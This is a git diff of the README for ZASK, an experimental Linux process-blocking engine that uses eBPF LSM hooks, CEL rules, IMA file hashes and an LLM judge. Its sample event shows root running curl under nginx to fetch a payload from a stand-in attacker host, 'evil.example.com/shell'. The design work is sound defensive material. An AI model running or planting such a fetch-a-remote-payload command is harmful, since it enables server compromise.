@@ -4,9 +4,9 @@ Autonomous Linux Kernel Hardening via eBPF LSM and AI.
 
 **ZASK (Zero-trust AI-Secured Kernel)** is an autonomous security engine that evaluates and blocks Linux processes using raw eBPF LSM telemetry, a deterministic engine, and a semantic AI-based judgement.
 
-Most security tools detect threats syntactically — matching signatures, hashes, or known-bad patterns. ZASK asks a different question: can Linux kernel-level security enforcement be made semantic? This is that attempt. 
+Most security tools detect threats syntactically — matching signatures, hashes, or known-bad patterns. ZASK asks a different question: can Linux kernel-level security enforcement be made semantic? This is that attempt. Read [Why ZASK exists?](./docs/03-architecture/motivation.md) for the motivation behind this project.
 
-> ⚠️ ZASK is still experimental, not yet a production-ready EDR. The ONNX tier is planned but not yet implemented. Feedback on the architecture, threat model, or approach is very welcome — open an issue or reach out directly.
+> ⚠️ ZASK is still experimental, not yet a production-ready EDR. The Machine Learning tier is planned but not yet implemented. Feedback on the architecture, threat model, or approach is very welcome — open an issue or reach out directly.
 
 ## Quick Links
 
@@ -40,17 +40,17 @@ flowchart LR
 
 ZASK operates a multi-tiered enforcement model inspired by [Daniel Kahneman's Thinking, *Fast and Slow*](https://en.wikipedia.org/wiki/Thinking,_Fast_and_Slow), System 1 (fast, intuitive) and System 2 (slow, deliberative, logical). 
 
-- **1. LSM Hooks:** The kernel provides the raw behavioral facts (syscall sequences, inodes, arguments) through eBPF LSM hooks.
+- **1. LSM Hooks:** The kernel provides the raw behavioral facts (syscall sequences, arguments, and [IMA](https://sourceforge.net/p/linux-ima/wiki/Home/)-based file hashes) through eBPF LSM hooks.
 - **2. Configured Rules:** A Go engine evaluates known bad patterns and enforces simple rules with minimal latency. When a process matches a determinisitc policy rule, described using `Common Expression Language (CEL)`, it is blocked/allowed immediately without further analysis. If no matches, the event can be escalated to the AI tiers.
-- **3. The Fast Path (System 1 - ONNX) [planned]:** Event is evaluated by an embedded, ultra-fast ONNX-based Machine Learning model. Clear threats are handled in milliseconds.
+- **3. The Fast Path (System 1 - ML) [planned]:** Event is evaluated by a discriminative model (ONNX-based), using traditional Machine Learning. Clasifies threats are handled in milliseconds. Alternative approach could be to use a BERT-based model for semantic classification, but latency would likely be higher. This tier is meant to catch similar patterns that the rule engine misses.
 - **4. The Deep Arbiter (System 2 - LLM):** When the the fast model confidence falls into the "gray zone," ZASK escalates the case to the LLM. The LLM acts as a judge and performs semantic reasoning to issue a final verdict (Block vs. Allow).
 - **5. The Alerting:** Asynchronously, ZASK can be configured to emit events for all executions, regardless of verdict, to a variety of outputs (JSON, Parquet, text) for security information and event management (SIEM).
 
 | Tier | Layer | Mechanism | Latency | Purpose |
 |------|-------|-----------|---------|---------|
-| **1** | Kernel | eBPF LSM + Inode Map | < 1μs | Instant blocking based on known bad inodes |
+| **1** | Kernel | eBPF LSM + IMA Hash Map | < 1μs | Instant blocking based on known bad content hashes |
 | **2** | User-space | Configured Rules | < 10ms | CEL policy matching |
-| **3** | User-space | Fast Classifier | < 50ms | Local ONNX machine learning model triage |
+| **3** | User-space | Fast Classifier | < 50ms | Local machine learning model triage |
 | **4** | User-space/remote | LLM Semantic Judge | 5-10s | Gen AI reasoning on process intent for ambiguous cases |
 
 
@@ -71,7 +71,7 @@ The unique value proposition of ZASK is the integration of AI into the kernel-le
 
 The events sent to the LLM include comprehensive context for analysis:
 
-```
+```yaml
 User: root (UID 0)
 Command: /usr/bin/curl -o /tmp/payload https://evil.example.com/shell
 Parent: nginx
@@ -105,6 +105,10 @@ Rules are aware of script interpreters (configurable list), a common evasion tec
   severity: critical
 ```
 
+### Sigma based rules [planned]
+
+ZASK will support Sigma-like rules. This allows security teams to easily translate existing Sigma rules into ZASK policies, leveraging the rich ecosystem of Sigma signatures for Linux process behaviors. 
+
 ### AI Resilience & Fail-Safe Defaults
 
 ZASK treats AI availability as an operational concern, not a hard dependency. If the LLM provider is slow, unreachable, or overwhelmed these patterns ensure the daemon remains operational:
@@ -123,11 +127,19 @@ ZASK is built to feel immediately familiar to anyone who operates Kubernetes clu
 - A Prometheus `/metrics` endpoint exposes functional metrics for standard scraping *(planned)*
 - Operationally, ZASK runs as a **DaemonSet** — one pod per node — relying on the fact that all containers on a node share the host kernel. 
 
+### Tamper-Resistant Binary Identity via IMA
+
+ZASK uses **[IMA (Integrity Measurement Architecture)](https://sourceforge.net/p/linux-ima/wiki/Home/)** to identify binaries by their SHA-256 content hash rather than by inode number. This provides three concrete security benefits:
+
+1. **Tamper detection:** If an attacker overwrites a binary in-place (same path, same inode), IMA detects the changed content and the old ALLOW verdict no longer applies.
+2. **Cross-container deduplication:** Identical container images on different nodes could share hash information.
+3. **Hash-based threat intel:** STIX/TAXII feeds, VirusTotal, and Sigma `Hashes` fields distribute known-bad SHA-256 hashes; ZASK can consume them directly.
+
 ### Multi-Format Audit Logging
 
 The goal of ZASK is to integrate into a cluster-wide logging pipeline (e.g., Fluent Bit). Security events are written to one or more audit outputs simultaneously:
 
-- **JSON** (NDJSON) — for log pipelines and SIEM ingestion
+- **JSON** (NDJSON) — for log pipelines and external SIEM integration
 - **Parquet** — columnar format for effective storage and retrieval *(planned)*
 - **Text** — human-readable console output *(planned)*
 
@@ -172,8 +184,8 @@ The documentation is split in the following sections:
 ## Challenges and Open Design Questions
 
 - **Will two AI tiers catch novel threats?** The AI integration is the most unique aspect of ZASK. Many base64-encoded attacks and anomalous parent-child relationships (e.g., `curl` spawned by `nginx`) should be caught by the LLM tier. 
-- **ONNX training data sourcing.** The ML model requires representative datasets of malicious and benign execution patterns. Where to source this data? Will schema changes (e.g., adding new fields to the event struct) require retraining? *Suggestion: use the NDJSON audit logs from monitor-mode deployments as a labeling pipeline — human analysts tag verdicts, which feed back into training.*
-- **The `AI_QUEUE` execution window.** When an event is escalated to the LLM, the process continues running while the AI deliberates. Can an attacker exploit this window? *Mitigation: the ONNX fast path should shrink the window to near-zero for known patterns. Subsequent attempts are blocked at the kernel level.*
+- **Traditional ML training data sourcing.** The ML model requires representative datasets of malicious and benign execution patterns. Where to source this data? Will schema changes (e.g., adding new fields to the event struct) require retraining? *Suggestion: use the NDJSON audit logs from monitor-mode deployments as a labeling pipeline — human analysts tag verdicts, which feed back into training.*
+- **The `AI_QUEUE` execution window.** When an event is escalated to the LLM, the process continues running while the AI deliberates. Can an attacker exploit this window following Time-of-Check to Time-of-Use (TOCTOU)? *Mitigation: the ONNX fast path should shrink the window. Subsequent attempts are blocked at the kernel level. This needs deep analysis.*
 
 ### Roadmap
 
